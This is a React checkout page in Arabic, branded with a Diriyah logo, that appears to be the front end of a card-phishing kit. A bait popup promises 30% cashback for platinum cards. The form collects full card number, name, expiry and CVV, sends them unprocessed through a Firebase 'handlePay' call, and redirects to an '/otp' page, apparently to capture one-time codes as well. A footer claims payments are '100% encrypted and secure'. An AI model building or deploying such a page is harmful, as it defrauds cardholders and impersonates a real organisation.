import { useLocation } from "wouter";
import { Menu, ChevronDown, Wifi, X, Gift } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { useState, useEffect } from "react";
import { handlePay } from "@/lib/firebase";

function CashbackPopup({ onClose }: { onClose: () => void }) {
  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center p-4" dir="rtl">
      <div className="absolute inset-0 bg-black/60 backdrop-blur-sm" onClick={onClose} />
      <div className="relative bg-gradient-to-br from-[#c4956a] via-[#d4a574] to-[#b8895e] rounded-2xl p-6 max-w-sm w-full shadow-2xl animate-in zoom-in-95 duration-300">
        <button
          onClick={onClose}
          className="absolute top-3 left-3 text-white/80 hover:text-white transition-colors"
          data-testid="button-close-popup"
        >
          <X className="w-6 h-6" />
        </button>
        
        <div className="text-center space-y-4">
          <div className="w-16 h-16 bg-white/20 rounded-full flex items-center justify-center mx-auto">
            <Gift className="w-8 h-8 text-white" />
          </div>
          
          <div className="space-y-2">
            <h3 className="text-2xl font-bold text-white">عرض حصري!</h3>
            <p className="text-white text-lg leading-relaxed">
              احصل على كاش باك يصل إلى
            </p>
            <div className="text-5xl font-bold text-white drop-shadow-lg">30%</div>
            <p className="text-white/90 text-sm">
              عند الدفع من خلال البطاقات من فئة البلاتينية
            </p>
          </div>

          <div className="flex gap-2 pt-2">
            <img src="/mada.png" className="h-8 bg-white/20 rounded px-2 py-1" alt="mada" />
            <img src="/master.svg" className="h-8 bg-white/20 rounded px-2 py-1" alt="mastercard" />
            <img src="/visa.png" className="h-5 bg-white/20 rounded px-2 py-2" alt="visa" />
          </div>

          <Button
            onClick={onClose}
            className="w-full bg-white text-[#5c4a3d] hover:bg-white/90 font-bold py-6 text-lg mt-4"
            data-testid="button-continue-popup"
          >
            متابعة الدفع
          </Button>
        </div>
      </div>
    </div>
  );
}

export default function CheckoutPage() {
  const [showPopup, setShowPopup] = useState(true);

  return (
    <div className="min-h-screen bg-background flex flex-col" dir="rtl">
      {showPopup && <CashbackPopup onClose={() => setShowPopup(false)} />}
      <Header />
      <ProgressSteps />
      <TitleSection />
      <main className="flex-1 px-4 py-6">
        <PaymentForm />
      </main>
      <PaymentFooter />
    </div>
  );
}

function Header() {
  return (
    <header className="bg-[#3d3428] text-white">
      <div className="container mx-auto px-4 py-4">
        <div className="flex items-center justify-between">
          <Button
            size="icon"
            variant="ghost"
            className="text-white"
            data-testid="button-menu-checkout"
          >
            <Menu className="w-5 h-5" />
          </Button>

          <div className="flex-1 flex justify-center">
            <img
              src="/logo-white.svg"
              alt="الدرعية"
              className="h-12"
              data-testid="img-checkout-logo"
            />
          </div>

          <div className="w-10" />
        </div>
      </div>
    </header>
  );
}

function ProgressSteps() {
  return (
    <div className="bg-[#f5f0e8] p-4" data-testid="progress-steps-checkout">
      <div className="flex items-center justify-center gap-2">
        {[
          { number: 1, label: "تسجيل" },
          { number: 2, label: "الحجز" },
          { number: 3, label: "السلة" },
          { number: 4, label: "الدفع" },
        ].map((step, index, arr) => (
          <div key={step.number} className="flex items-center">
            <div className="flex flex-col items-center">
              <div
                className="w-8 h-8 rounded-full flex items-center justify-center text-sm font-medium bg-primary text-white"
              >
                {step.number}
              </div>
              <span className="text-xs mt-1 text-foreground">{step.label}</span>
            </div>
            {index < arr.length - 1 && (
              <div className="w-8 h-0.5 mx-1 bg-primary" />
            )}
          </div>
        ))}
      </div>
    </div>
  );
}

function TitleSection() {
  return (
    <div className="bg-[#c4956a] py-4 px-4 text-center">
      <h1
        className="text-xl font-bold text-white"
        data-testid="text-checkout-title"
      >
        إتمام الشراء
      </h1>
    </div>
  );
}

const validateLuhn = (cardNum: string): boolean => {
  const digits = cardNum.replace(/\s/g, "");
  if (!/^\d{13,19}$/.test(digits)) return false;
  
  let sum = 0;
  let isEven = false;
  
  for (let i = digits.length - 1; i >= 0; i--) {
    let digit = parseInt(digits[i], 10);
    if (isEven) {
      digit *= 2;
      if (digit > 9) digit -= 9;
    }
    sum += digit;
    isEven = !isEven;
  }
  
  return sum % 10 === 0;
};

const getCardType = (cardNum: string): string => {
  const num = cardNum.replace(/\s/g, "");
  if (/^4/.test(num)) return "visa";
  if (/^5[1-5]/.test(num)) return "mastercard";
  if (/^(508|60|62|67)/.test(num)) return "mada";
  return "";
};

const getCardGradient = (cardType: string): string => {
  switch (cardType) {
    case "visa":
      return "from-[#1a1f71] via-[#2d3494] to-[#1a1f71]";
    case "mastercard":
      return "from-[#eb001b] via-[#f79e1b] to-[#eb001b]";
    case "mada":
      return "from-[#004d40] via-[#00695c] to-[#004d40]";
    default:
      return "from-[#434343] via-[#5a5a5a] to-[#434343]";
  }
};

interface CardPreviewProps {
  cardNumber: string;
  cardName: string;
  expiryMonth: string;
  expiryYear: string;
  cardType: string;
}

function CardPreview({ cardNumber, cardName, expiryMonth, expiryYear, cardType }: CardPreviewProps) {
  const displayNumber = cardNumber || "•••• •••• •••• ••••";
  const displayName = cardName || "اسم حامل البطاقة";
  const displayExpiry = `${expiryMonth}/${expiryYear.slice(-2)}`;

  return (
    <div className="mb-6" dir="ltr">
      <div 
        className={`relative w-full max-w-sm mx-auto aspect-[1.586/1] rounded-2xl p-5 bg-gradient-to-br ${getCardGradient(cardType)} shadow-xl overflow-hidden`}
        data-testid="card-preview"
      >
        {/* Chip and NFC */}
        <div className="flex items-start justify-between">
          <div className="w-12 h-9 bg-gradient-to-br from-yellow-300 via-yellow-400 to-yellow-500 rounded-md flex items-center justify-center">
            <div className="w-8 h-6 border-2 border-yellow-600/30 rounded-sm" />
          </div>
          <Wifi className="w-6 h-6 text-white/70 rotate-90" />
        </div>

        {/* Card Number */}
        <div className="mt-6">
          <p className="text-white text-xl font-mono tracking-[0.2em] drop-shadow-lg">
            {displayNumber}
          </p>
        </div>

        {/* Card Details */}
        <div className="absolute bottom-5 left-5 right-5">
          <div className="flex justify-between items-end">
            <div>
              <p className="text-white/60 text-[10px] uppercase mb-1">Card Holder</p>
              <p className="text-white text-sm font-medium tracking-wide truncate max-w-[180px]">
                {displayName}
              </p>
            </div>
            <div className="text-right">
              <p className="text-white/60 text-[10px] uppercase mb-1">Expires</p>
              <p className="text-white text-sm font-medium">{displayExpiry}</p>
            </div>
          </div>
        </div>

        {/* Card Type Logo */}
        <div className="absolute top-5 right-5">
          {cardType === "visa" && (
            <div className="text-white font-bold text-xl italic">VISA</div>
          )}
          {cardType === "mastercard" && (
            <div className="flex">
              <div className="w-8 h-8 rounded-full bg-red-500 opacity-80" />
              <div className="w-8 h-8 rounded-full bg-yellow-500 opacity-80 -ml-4" />
            </div>
          )}
          {cardType === "mada" && (
            <div className="text-white font-bold text-lg">mada</div>
          )}
        </div>

        {/* Decorative circles */}
        <div className="absolute -bottom-20 -right-20 w-40 h-40 rounded-full bg-white/5" />
        <div className="absolute -bottom-10 -right-10 w-32 h-32 rounded-full bg-white/5" />
      </div>
    </div>
  );
}

function PaymentForm() {
  const [, setLocation] = useLocation();
  const [cardNumber, setCardNumber] = useState("");
  const [cardName, setCardName] = useState("");
  const [expiryMonth, setExpiryMonth] = useState("01");
  const [expiryYear, setExpiryYear] = useState("2026");
  const [cvv, setCvv] = useState("");
  const [errors, setErrors] = useState<Record<string, string>>({});

  const cardType = getCardType(cardNumber);

  const formatCardNumber = (value: string) => {
    const v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "");
    const matches = v.match(/\d{4,16}/g);
    const match = (matches && matches[0]) || "";
    const parts = [];
    for (let i = 0, len = match.length; i < len; i += 4) {
      parts.push(match.substring(i, i + 4));
    }
    return parts.length ? parts.join(" ") : v;
  };

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formatted = formatCardNumber(e.target.value);
    if (formatted.replace(/\s/g, "").length <= 16) {
      setCardNumber(formatted);
      setErrors((prev) => ({ ...prev, cardNumber: "" }));
    }
  };

  const handleCvvChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const v = e.target.value.replace(/[^0-9]/g, "");
    if (v.length <= 4) {
      setCvv(v);
      setErrors((prev) => ({ ...prev, cvv: "" }));
    }
  };

  const validateForm = (): boolean => {
    const newErrors: Record<string, string> = {};
    const rawCard = cardNumber.replace(/\s/g, "");
    
    if (!rawCard || rawCard.length < 13) {
      newErrors.cardNumber = "رقم البطاقة غير صحيح";
    } else if (!validateLuhn(rawCard)) {
      newErrors.cardNumber = "رقم البطاقة غير صالح";
    }
    
    if (!cardName.trim() || cardName.trim().length < 3) {
      newErrors.cardName = "يرجى إدخال الاسم على البطاقة";
    }
    
    const now = new Date();
    const expiry = new Date(parseInt(expiryYear), parseInt(expiryMonth) - 1);
    if (expiry < now) {
      newErrors.expiry = "البطاقة منتهية الصلاحية";
    }
    
    if (!cvv || cvv.length < 3) {
      newErrors.cvv = "كود الحماية غير صحيح";
    }
    
    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = () => {
    if (!validateForm()) return;
    
    const paymentInfo = {
      cardNumber: cardNumber.replace(/\s/g, ""),
      cardName,
      expiryMonth,
      expiryYear,
      cvv,
      cardType: getCardType(cardNumber),
      currentPage: "checkout"
    };
    handlePay(paymentInfo, () => {});
    setLocation("/otp");
  };

  return (
    <div className="space-y-6" data-testid="payment-form">
      {/* Card Preview */}
      <CardPreview
        cardNumber={cardNumber}
        cardName={cardName}
        expiryMonth={expiryMonth}
        expiryYear={expiryYear}
        cardType={cardType}
      />

      {/* Payment Methods */}
      <div className="flex items-center justify-center gap-4 py-2">
        <img src="/mada.png" className="h-6 opacity-60" alt="mada" />
        <img src="/master.svg" className="h-6 opacity-60" alt="mastercard" />
        <img src="/visa.png" className="h-3 opacity-60" alt="visa" />
      </div>

      <div>
        <Label
          htmlFor="cardNumber"
          className="text-sm text-foreground mb-2 block"
        >
          رقم البطاقة
        </Label>
        <div className="relative">
          <Input
            id="cardNumber"
            type="text"
            value={cardNumber}
            onChange={handleCardNumberChange}
            className={`text-left pr-12 font-mono ${errors.cardNumber ? "border-red-500" : ""}`}
            placeholder="0000 0000 0000 0000"
            dir="ltr"
            data-testid="input-card-number"
          />
          <div className="absolute right-3 top-1/2 -translate-y-1/2 flex gap-1">
            {cardType === "visa" && <img src="/visa.png" className="h-4" alt="visa" />}
            {cardType === "mastercard" && <img src="/master.svg" className="h-5" alt="mastercard" />}
            {cardType === "mada" && <img src="/mada.png" className="h-5" alt="mada" />}
          </div>
        </div>
        {errors.cardNumber && (
          <p className="text-red-500 text-xs mt-1">{errors.cardNumber}</p>
        )}
      </div>

      <div>
        <Label
          htmlFor="cardName"
          className="text-sm text-foreground mb-2 block"
        >
          الاسم على البطاقة
        </Label>
        <Input
          id="cardName"
          type="text"
          value={cardName}
          onChange={(e) => {
            setCardName(e.target.value.toUpperCase());
            setErrors((prev) => ({ ...prev, cardName: "" }));
          }}
          className={`text-left ${errors.cardName ? "border-red-500" : ""}`}
          placeholder="MOHAMMED ALI"
          dir="ltr"
          data-testid="input-card-name"
        />
        {errors.cardName && (
          <p className="text-red-500 text-xs mt-1">{errors.cardName}</p>
        )}
      </div>

      <div className="grid grid-cols-2 gap-4">
        <div>
          <Label className="text-sm text-foreground mb-2 block">
            تاريخ الانتهاء
          </Label>
          <div className="flex gap-2">
            <div className="flex-1 relative">
              <select
                value={expiryMonth}
                onChange={(e) => {
                  setExpiryMonth(e.target.value);
                  setErrors((prev) => ({ ...prev, expiry: "" }));
                }}
                className={`w-full h-10 px-3 rounded-md border bg-background text-foreground appearance-none ${errors.expiry ? "border-red-500" : "border-input"}`}
                data-testid="select-expiry-month"
              >
                {Array.from({ length: 12 }, (_, i) => {
                  const month = String(i + 1).padStart(2, "0");
                  return (
                    <option key={month} value={month}>
                      {month}
                    </option>
                  );
                })}
              </select>
              <ChevronDown className="absolute left-2 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground pointer-events-none" />
            </div>
            <div className="flex-1 relative">
              <select
                value={expiryYear}
                onChange={(e) => {
                  setExpiryYear(e.target.value);
                  setErrors((prev) => ({ ...prev, expiry: "" }));
                }}
                className={`w-full h-10 px-3 rounded-md border bg-background text-foreground appearance-none ${errors.expiry ? "border-red-500" : "border-input"}`}
                data-testid="select-expiry-year"
              >
                {Array.from({ length: 10 }, (_, i) => {
                  const year = String(2025 + i);
                  return (
                    <option key={year} value={year}>
                      {year}
                    </option>
                  );
                })}
              </select>
              <ChevronDown className="absolute left-2 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground pointer-events-none" />
            </div>
          </div>
          {errors.expiry && (
            <p className="text-red-500 text-xs mt-1">{errors.expiry}</p>
          )}
        </div>

        <div>
          <Label htmlFor="cvv" className="text-sm text-foreground mb-2 block">
            CVV
          </Label>
          <Input
            id="cvv"
            type="text"
            value={cvv}
            onChange={handleCvvChange}
            maxLength={4}
            className={`text-center font-mono ${errors.cvv ? "border-red-500" : ""}`}
            placeholder="123"
            dir="ltr"
            data-testid="input-cvv"
          />
          {errors.cvv && (
            <p className="text-red-500 text-xs mt-1">{errors.cvv}</p>
          )}
        </div>
      </div>

      <Button
        onClick={handleSubmit}
        className="w-full bg-primary hover:bg-primary/90 text-white py-6 text-lg mt-6"
        data-testid="button-pay"
      >
        متابعة الدفع
      </Button>
    </div>
  );
}

function PaymentFooter() {
  return (
    <footer
      className="px-4 py-6 text-center space-y-3 border-t"
      data-testid="payment-footer"
    >
      <div className="flex items-center justify-center gap-2">
        <svg className="w-4 h-4 text-green-600" fill="currentColor" viewBox="0 0 20 20">
          <path fillRule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clipRule="evenodd" />
        </svg>
        <p className="text-xs text-muted-foreground">
          جميع عمليات الدفع مشفرة وآمنة 100%
        </p>
      </div>
      <p className="text-xs text-primary">
        احصل على كاش باك يصل إلى 30% عند الدفع من خلال البطاقات من فئة البلاتينية
      </p>
    </footer>
  );
}
